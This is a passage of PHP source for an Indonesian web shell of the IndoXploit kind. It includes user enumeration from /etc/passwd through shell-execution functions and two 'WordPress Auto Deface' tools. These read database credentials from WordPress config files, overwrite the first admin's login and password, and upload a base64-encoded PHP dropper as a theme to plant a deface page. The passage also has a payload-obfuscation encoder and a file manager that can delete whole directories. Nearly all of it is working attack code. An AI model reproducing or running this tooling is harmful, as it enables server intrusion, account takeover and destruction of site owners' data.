    <td><form method="post"><input type="submit" value="Awk Program" name="awkuser"></form></td>
    <td><form method="post"><input type="submit" value="System Function" name="systuser"></form></td>
    <td><form method="post"><input type="submit" value="Passthru Function" name="passthuser"></form></td>   
    <td><form method="post"><input type="submit" value="Exec Function" name="exuser"></form></td>       
    <td><form method="post"><input type="submit" value="Shell_exec Function" name="shexuser"></form></td>
</tr>
</table><br>';


if ($_POST['awkuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
echo "</textarea><br>";
}
if ($_POST['systuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo system("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['passthuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo passthru("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['exuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo exec("ls /var/mail");
echo "</textarea><br>";
}
if ($_POST['shexuser']) {
echo"<textarea class='inputzbut' cols='65' rows='15'>";
echo shell_exec("ls /var/mail");
echo "</textarea><br>";
}
if($_POST['syst'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo system("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['passth'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo passthru("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['ex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
if($_POST['shex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
echo shell_exec("cat /etc/passwd");
echo"</textarea><br><br><b></b><br>";
}
echo '<center>';
if($_POST['melex'])
{
echo"<textarea class='inputz' cols='65' rows='15'>";
for($uid=0;$uid<60000;$uid++){ 
$ara = posix_getpwuid($uid);
if (!empty($ara)) {
while (list ($key, $val) = each($ara)){
print "$val:";
}
print "\n";
}
}
echo"</textarea><br><br>";
}
//

//
} elseif($_GET['do'] == 'auto_dwp') {
    if($_POST['auto_deface_wp']) {
        function anucurl($sites) {
            $ch = curl_init($sites);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        function lohgin($cek, $web, $userr, $pass, $wp_submit) {
            $post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
            $ch = curl_init($cek);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_POST, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        $scan = $_POST['link_config'];
        $link_config = scandir($scan);
        $script = htmlspecialchars($_POST['script']);
        $user = "0x1999";
        $pass = "0x1999";
        $passx = md5($pass);
        foreach($link_config as $dir_config) {
            if(!is_file("$scan/$dir_config")) continue;
            $config = file_get_contents("$scan/$dir_config");
            if(preg_match("/WordPress/", $config)) {
                $dbhost = ambilkata($config,"DB_HOST', '","'");
                $dbuser = ambilkata($config,"DB_USER', '","'");
                $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
                $dbname = ambilkata($config,"DB_NAME', '","'");
                $dbprefix = ambilkata($config,"table_prefix  = '","'");
                $prefix = $dbprefix."users";
                $option = $dbprefix."options";
                $conn = mysql_connect($dbhost,$dbuser,$dbpass);
                $db = mysql_select_db($dbname);
                $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
                $result = mysql_fetch_array($q);
                $id = $result[ID];
                $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
                $result2 = mysql_fetch_array($q2);
                $target = $result2[option_value];
                if($target == '') {                 
                    echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
                } else {
                    echo "[+] $target <br>";
                }
                $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
                if(!$conn OR !$db OR !$update) {
                    echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
                    mysql_close($conn);
                } else {
                    $site = "$target/wp-login.php";
                    $site2 = "$target/wp-admin/theme-install.php?upload";
                    $b1 = anucurl($site2);
                    $wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
                    $b = lohgin($site, $site2, $user, $pass, $wp_sub);
                    $anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
                    $upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
                    $www = "m.php";
                    $fp5 = fopen($www,"w");
                    fputs($fp5,$upload3);
                    $post2 = array(
                            "_wpnonce" => "$anu2",
                            "_wp_http_referer" => "/wp-admin/theme-install.php?upload",
                            "themezip" => "@$www",
                            "install-theme-submit" => "Install Now",
                            );
                    $ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
                          curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                          curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                          curl_setopt($ch, CURLOPT_POST, 1);
                          curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
                          curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                          curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                          curl_setopt($ch, CURLOPT_COOKIESESSION, true);
                    $data3 = curl_exec($ch);
                          curl_close($ch);
                    $y = date("Y");
                    $m = date("m");
                    $namafile = "id.php";
                    $fpi = fopen($namafile,"w");
                    fputs($fpi,$script);
                    $ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
                           curl_setopt($ch6, CURLOPT_POST, true);
                           curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
                           curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
                           curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
                           curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
                           curl_setopt($ch6, CURLOPT_COOKIESESSION, true);
                    $postResult = curl_exec($ch6);
                           curl_close($ch6);
                    $as = "$target/k.php";
                    $bs = anucurl($as);
                    if(preg_match("#$script#is", $bs)) {
                        echo "[+] <font color='#FDF105'>Berhasil Depes...</font><br>";
                        echo "[+] <a href='$as' target='_blank'>$as</a><br><br>"; 
                        } else {
                        echo "[-] <font color='red'>gagal mepes...</font><br>";
                        echo "[!!] coba aja manual: <br>";
                        echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                        echo "[+] username: <font color=#FDF105>$user</font><br>";
                        echo "[+] password: <font color=#FDF105>$pass</font><br><br>";     
                        }
                    mysql_close($conn);
                }
            }
        }
    } else {
        echo "<center><h1>WordPress Auto Deface</h1>
        <form method='post'>
        <input type='text' name='link_config' size='50' height='10' value='$dir'><br>
        <input type='text' name='script' height='10' size='50' placeholder='Hacked By FirewalL21' required><br>
        <input type='submit' style='width: 450px;' name='auto_deface_wp' value='Hajar!!'>
        </form>
        <br><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: /home/user/public_html/nama_folder_config )</span>
        </center>";
    }
} elseif($_GET['do'] == 'auto_dwp2') {
    if($_POST['auto_deface_wp']) {
        function anucurl($sites) {
            $ch = curl_init($sites);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION,true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        function lohgin($cek, $web, $userr, $pass, $wp_submit) {
            $post = array(
                   "log" => "$userr",
                   "pwd" => "$pass",
                   "rememberme" => "forever",
                   "wp-submit" => "$wp_submit",
                   "redirect_to" => "$web",
                   "testcookie" => "1",
                   );
            $ch = curl_init($cek);
                  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                  curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
                  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                  curl_setopt($ch, CURLOPT_POST, 1);
                  curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
                  curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                  curl_setopt($ch, CURLOPT_COOKIESESSION, true);
            $data = curl_exec($ch);
                  curl_close($ch);
            return $data;
        }
        $link = explode("\r\n", $_POST['link']);
        $script = htmlspecialchars($_POST['script']);
        $user = "indoxploit";
        $pass = "indoxploit";
        $passx = md5($pass);
        foreach($link as $dir_config) {
            $config = anucurl($dir_config);
            $dbhost = ambilkata($config,"DB_HOST', '","'");
            $dbuser = ambilkata($config,"DB_USER', '","'");
            $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
            $dbname = ambilkata($config,"DB_NAME', '","'");
            $dbprefix = ambilkata($config,"table_prefix  = '","'");
            $prefix = $dbprefix."users";
            $option = $dbprefix."options";
            $conn = mysql_connect($dbhost,$dbuser,$dbpass);
            $db = mysql_select_db($dbname);
            $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
            $result = mysql_fetch_array($q);
            $id = $result[ID];
            $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
            $result2 = mysql_fetch_array($q2);
            $target = $result2[option_value];
            if($target == '') {                 
                echo "[-] <font color=red>error, gabisa ambil nama domain nya</font><br>";
            } else {
                echo "[+] $target <br>";
            }
            $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE ID='$id'");
            if(!$conn OR !$db OR !$update) {
                echo "[-] MySQL Error: <font color=red>".mysql_error()."</font><br><br>";
                mysql_close($conn);
            } else {
                $site = "$target/wp-login.php";
                $site2 = "$target/wp-admin/theme-install.php?upload";
                $b1 = anucurl($site2);
                $wp_sub = ambilkata($b1, "id=\"wp-submit\" class=\"button button-primary button-large\" value=\"","\" />");
                $b = lohgin($site, $site2, $user, $pass, $wp_sub);
                $anu2 = ambilkata($b,"name=\"_wpnonce\" value=\"","\" />");
                $upload3 = base64_decode("Z2FudGVuZw0KPD9waHANCiRmaWxlMyA9ICRfRklMRVNbJ2ZpbGUzJ107DQogICRuZXdmaWxlMz0iay5waHAiOw0KICAgICAgICAgICAgICAgIGlmIChmaWxlX2V4aXN0cygiLi4vLi4vLi4vLi4vIi4kbmV3ZmlsZTMpKSB1bmxpbmsoIi4uLy4uLy4uLy4uLyIuJG5ld2ZpbGUzKTsNCiAgICAgICAgbW92ZV91cGxvYWRlZF9maWxlKCRmaWxlM1sndG1wX25hbWUnXSwgIi4uLy4uLy4uLy4uLyRuZXdmaWxlMyIpOw0KDQo/Pg==");
                $www = "m.php";
                $fp5 = fopen($www,"w");
                fputs($fp5,$upload3);
                $post2 = array(
                        "_wpnonce" => "$anu2",
                        "_wp_http_referer" => "/wp-admin/theme-install.php?upload",
                        "themezip" => "@$www",
                        "install-theme-submit" => "Install Now",
                        );
                $ch = curl_init("$target/wp-admin/update.php?action=upload-theme");
                      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                      curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                      curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
                      curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                      curl_setopt($ch, CURLOPT_POST, 1);
                      curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
                      curl_setopt($ch, CURLOPT_COOKIEJAR,'cookie.txt');
                      curl_setopt($ch, CURLOPT_COOKIEFILE,'cookie.txt');
                      curl_setopt($ch, CURLOPT_COOKIESESSION, true);
                $data3 = curl_exec($ch);
                      curl_close($ch);
                $y = date("Y");
                $m = date("m");
                $namafile = "id.php";
                $fpi = fopen($namafile,"w");
                fputs($fpi,$script);
                $ch6 = curl_init("$target/wp-content/uploads/$y/$m/$www");
                       curl_setopt($ch6, CURLOPT_POST, true);
                       curl_setopt($ch6, CURLOPT_POSTFIELDS, array('file3'=>"@$namafile"));
                       curl_setopt($ch6, CURLOPT_RETURNTRANSFER, 1);
                       curl_setopt($ch6, CURLOPT_COOKIEFILE, "cookie.txt");
                       curl_setopt($ch6, CURLOPT_COOKIEJAR,'cookie.txt');
                       curl_setopt($ch6, CURLOPT_COOKIESESSION,true);
                $postResult = curl_exec($ch6);
                       curl_close($ch6);
                $as = "$target/k.php";
                $bs = anucurl($as);
                if(preg_match("#$script#is", $bs)) {
                    echo "[+] <font color='#FDF105'>berhasil Deface...</font><br>";
                    echo "[+] <a href='$as' target='_blank'>$as</a><br><br>"; 
                    } else {
                    echo "[-] <font color='red'>gagal Deface...</font><br>";
                    echo "[!!] coba aja manual: <br>";
                    echo "[+] <a href='$target/wp-login.php' target='_blank'>$target/wp-login.php</a><br>";
                    echo "[+] username: <font color=#FDF105>$user</font><br>";
                    echo "[+] password: <font color=#FDF105>$pass</font><br><br>";     
                    }
                mysql_close($conn);
            }
        }
    } else {
        echo "<center><h1>WordPress Auto Deface V.2</h1>
        <form method='post'>
        Link Config: <br>
        <textarea name='link' placeholder='http://target.com/idx_config/user-config.txt' style='width: 450px; height:250px;'></textarea><br>
        <input type='text' name='script' height='10' size='50' placeholder='Hacked By FirewalL21' required><br>
        <input type='submit' style='width: 450px;' name='auto_deface_wp' value='hantam!!'>
        </form></center>";
    }
} elseif($_GET['act'] == 'newfile') {
    if($_POST['new_save_file']) {
        $newfile = htmlspecialchars($_POST['newfile']);
        $fopen = fopen($newfile, "a+");
        if($fopen) {
            $act = "<script>window.location='?act=edit&dir=".$dir."&file=".$_POST['newfile']."';</script>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    }
    echo $act;
    echo "<form method='post'>
    Filename: <input type='text' name='newfile' value='$dir/newfile.php' style='width: 450px;' height='10'>
    <input type='submit' name='new_save_file' value='Submit'>
    </form>";
}
elseif ($_GET['do'] == 'string') {
        $text = $_POST['code'];
?><center>
<center class='mybox'><h1>String Encode & Decode</h1>
<form method="post"><br>
<textarea class='mybox' cols=80 rows=10 name="code"></textarea><br><br>
<select size="1" name="ope">
<option value="urlencode" style='background:transparent;color:aqua;'>url</option>
<option value="base64" style='background:transparent;color:aqua;'>Base64</option>
<option value="ur" style='background:transparent;color:aqua;'>convert_uu</option>
<option value="json" style='background:transparent;color:aqua;'>json</option>
<option value="gzinflates" style='background:transparent;color:aqua;'>gzinflate - base64</option>
<option value="str2" style='background:transparent;color:aqua;'>str_rot13 - base64</option>
<option value="gzinflate" style='background:transparent;color:aqua;'>str_rot13 - gzinflate - base64</option>
<option value="gzinflater" style='background:transparent;color:aqua;'>gzinflate - str_rot13 - base64</option>
<option value="gzinflatex" style='background:transparent;color:aqua;'>gzinflate - str_rot13 - gzinflate - base64</option>
<option value="gzinflatew" style='background:transparent;color:aqua;'>str_rot13 - convert_uu - url - gzinflate - str_rot13 - base64 - convert_uu - gzinflate - url - str_rot13 - gzinflate - base64</option>
<option value="str" style='background:transparent;color:aqua;'>str_rot13 - gzinflate - str_rot13 - base64</option>
<option value="url" style='background:transparent;color:aqua;'>base64 - gzinflate - str_rot13 - convert_uu - gzinflate - base64</option>
<option value="hexencode" style='background:transparent;color:aqua;'>Hex Encode/Decode</option>
<option value="md5" style='background:transparent;color:aqua;'><center>MD5 Hash</option>
<option value="sha1" style='background:transparent;color:aqua;'>SHA1 Hash</option>
<option value="str_rot13" style='background:transparent;color:aqua;'>ROT13 Hash</option>
<option value="strlen" style='background:transparent;color:aqua;'>strlen</option>
<option value="xxx" style='background:transparent;color:aqua;'>unescape</option>
<option value="bbb" style='background:transparent;color:aqua;'>charAt</option>
<option value="aaa" style='background:transparent;color:aqua;'>chr - bin2hex - substr</option>
<option value="www" style='background:transparent;color:aqua;'>chr</option>
<option value="sss" style='background:transparent;color:aqua;'>htmlspecialchars</option>
<option value="eee" style='background:transparent;color:aqua;'>escape</option></select>&nbsp;
<input class='kotak' type='submit' name='submit' value='Encrypt'>
<input class='kotak' type='submit' name='crack' value='Decrypt'>
</form>

<?php
        $submit = $_POST['submit'];
        if (isset($submit)) {
            $op = $_POST["ope"];
            switch ($op) {
                case 'base64':
                    $codi = base64_encode($text);
                break;
                case 'str':
                    $codi = (base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
                break;
                case 'json':
                    $codi = json_encode(utf8_encode($text));
                break;
                case 'gzinflate':
                    $codi = base64_encode(gzdeflate(str_rot13($text)));
                break;
                case 'gzinflater':
                    $codi = base64_encode(str_rot13(gzdeflate($text)));
                break;
                case 'gzinflatex':
                    $codi = base64_encode(gzdeflate(str_rot13(gzdeflate($text))));
                break;
                case 'gzinflatew':
                    $codi = base64_encode(gzdeflate(str_rot13(rawurlencode(gzdeflate(convert_uuencode(base64_encode(str_rot13(gzdeflate(convert_uuencode(rawurldecode(str_rot13($text))))))))))));
                break;
                case 'gzinflates':
                    $codi = base64_encode(gzdeflate($text));
                break;
                case 'str2':
                    $codi = base64_encode(str_rot13($text));
                break;
                case 'urlencode':
                    $codi = rawurlencode($text);
                break;
                case 'hexencode':
                    $codi = bin2hex($text);
                break;
                case 'md5':
                    $codi = md5($text);
                break;
                case 'ur':
                    $codi = convert_uuencode($text);
                break;
                case 'str_rot13':
                    $codi = str_rot13($text);
                break;
                case 'sha1':
                    $codi = sha1($text);
                break;
                case 'strlen':
                    $codi = strlen($text);
                break;
                case 'xxx':
                    $codi = strlen(bin2hex($text));
                break;
                case 'bbb':
                    $codi = htmlentities(utf8_decode($text));
                break;
                case 'aaa':
                    $codi = chr(bin2hex(substr($text)));
                break;
                case 'www':
                    $codi = chr($text);
                break;
                case 'sss':
                    $codi = htmlspecialchars($text);
                break;
                case 'eee':
                    $codi = addslashes($text);
                break;
                case 'url':
                    $codi = base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode($text))))));
                break;
                default:
                break;
            }
        }
        // Decrypt Start Now !!
        $submit = $_POST['crack'];
        if (isset($submit)) {
            $op = $_POST["ope"];
            switch ($op) {
                case 'base64':
                    $codi = base64_decode($text);
                break;
                case 'str':
                    $codi = str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
                break;
                case 'json':
                    $codi = utf8_dencode(json_dencode($text));
                break;
                case 'gzinflate':
                    $codi = str_rot13(gzinflate(base64_decode($text)));
                break;
                case 'gzinflater':
                    $codi = gzinflate(str_rot13(base64_decode($text)));
                break;
                case 'gzinflatex':
                    $codi = gzinflate(str_rot13(gzinflate(base64_decode($text))));
                break;
                case 'gzinflatew':
                    $codi = str_rot13(rawurldecode(convert_uudecode(gzinflate(str_rot13(base64_decode(convert_uudecode(gzinflate(rawurldecode(str_rot13(gzinflate(base64_decode($text))))))))))));
                break;
                case 'gzinflates':
                    $codi = gzinflate(base64_decode($text));
                break;
                case 'str2':
                    $codi = str_rot13(base64_decode($text));
                break;
                case 'urlencode':
                    $codi = rawurldecode($text);
                break;
                case 'hexencode':
                    $codi = quoted_printable_decode($text);
                break;
                case 'ur':
                    $codi = convert_uudecode($text);
                break;
                case 'url':
                    $codi = base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($text)))))));
                break;
                default:
                break;
            }
        }
        echo '<textarea cols=80 rows=10 class="mybox" readonly>' . $codi . '</textarea></center><BR><BR>';
}
 elseif($_GET['act'] == 'newfolder') {
    if($_POST['new_save_folder']) {
        $new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
        if(!mkdir($new_folder)) {
            $act = "<font color=red>permission denied</font>";
        } else {
            $act = "<script>window.location='?dir=".$dir."';</script>";
        }
    }
    echo $act;
    echo "<form method='post'>
    Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
    <input type='submit' name='new_save_folder' value='Submit'>
    </form>";
} elseif($_GET['act'] == 'rename_dir') {
    if($_POST['dir_rename']) {
        $dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
        if($dir_rename) {
            $act = "<script>window.location='?dir=".dirname($dir)."';</script>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    echo "".$act."<br>";
    }
    echo "<form method='post'>
    <input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
    <input type='submit' name='dir_rename' value='rename'>
    </form>";
} elseif($_GET['act'] == 'delete_dir') {
    function Delete($path)
{
    if (is_dir($path) === true)
    {
        $files = array_diff(scandir($path), array('.', '..'));
        foreach ($files as $file)
        {
            Delete(realpath($path) . '/' . $file);
        }
        return rmdir($path);
    }
    else if (is_file($path) === true)
    {
        return unlink($path);
    }
    return false;
}
    $delete_dir = Delete($dir);
    if($delete_dir) {
        $act = "<script>window.location='?dir=".dirname($dir)."';</script>";
    } else {
        $act = "<font color=red>could not remove ".basename($dir)."</font>";
    }
    echo $act;
} elseif($_GET['act'] == 'view') {
    echo "Filename: <font color=#FDF105>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
    echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
    if($_POST['save']) {
        $save = file_put_contents($_GET['file'], $_POST['src']);
        if($save) {
            $act = "<font color=#FDF105>Saved!</font>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    echo "".$act."<br>";
    }
    echo "Filename: <font color=#FDF105>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
    echo "<form method='post'>
    <textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
    <input type='submit' value='Save' name='save' style='width: 500px;'>
    </form>";
} elseif($_GET['act'] == 'rename') {
    if($_POST['do_rename']) {
        $rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
        if($rename) {
            $act = "<script>window.location='?dir=".$dir."';</script>";
        } else {
            $act = "<font color=red>permission denied</font>";
        }
    echo "".$act."<br>";
    }
    echo "Filename: <font color=#FDF105>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
    echo "<form method='post'>
    <input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
    <input type='submit' name='do_rename' value='rename'>
    </form>";
} elseif($_GET['act'] == 'delete') {
    $delete = unlink($_GET['file']);
    if($delete) {
        $act = "<script>window.location='?dir=".$dir."';</script>";
    } else {
        $act = "<font color=red>permission denied</font>";
    }
    echo $act;
}else {
    if(is_dir($dir) == true) {
        echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
        <tr>
        <th class="th_home"><center>Name</center></th>
        <th class="th_home"><center>Type</center></th>
        <th class="th_home"><center>Size</center></th>
        <th class="th_home"><center>Last Modified</center></th>
        <th class="th_home"><center>Permission</center></th>
        <th class="th_home"><center>Action</center></th>
        </tr>';
        $scandir = scandir($dir);
        foreach($scandir as $dirx) {
            $dtype = filetype("$dir/$dirx");
            $dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
            if(!is_dir("$dir/$dirx")) continue;
            if($dirx === '..') {
                $href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
            } elseif($dirx === '.') {
                $href = "<a href='?dir=$dir'>$dirx</a>";
            } else {
                $href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
            }
            if($dirx === '.' || $dirx === '..') {
                $act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
                } else {
                $act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
            }
            echo "<tr>";
            echo "<td class='td_home'><img src='data:image/png;base64,R0lGODlhEwAQALMAAAAAAP///5ycAM7OY///nP//zv/OnPf39////wAAAAAAAAAAAAAAAAAAAAAA"."AAAAACH5BAEAAAgALAAAAAATABAAAARREMlJq7046yp6BxsiHEVBEAKYCUPrDp7HlXRdEoMqCebp"."/4YchffzGQhH4YRYPB2DOlHPiKwqd1Pq8yrVVg3QYeH5RYK5rJfaFUUA3vB4fBIBADs='>$href</td>";
            echo "<td class='td_home'><center>$dtype</center></td>";
            echo "<td class='td_home'><center>-</center></th>";
            echo "<td class='td_home'><center>$dtime</center></td>";
            echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
            echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
        }
        echo "</tr>";
        foreach($scandir as $file) {
            $ftype = filetype("$dir/$file");
            $ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
            $size = filesize("$dir/$file")/1024;
            $size = round($size,3);
            if($size > 1024) {
                $size = round($size/1024,2). 'MB';
            } else {
                $size = $size. 'KB';
            }
            if(!is_file("$dir/$file")) continue;
            echo "<tr>";
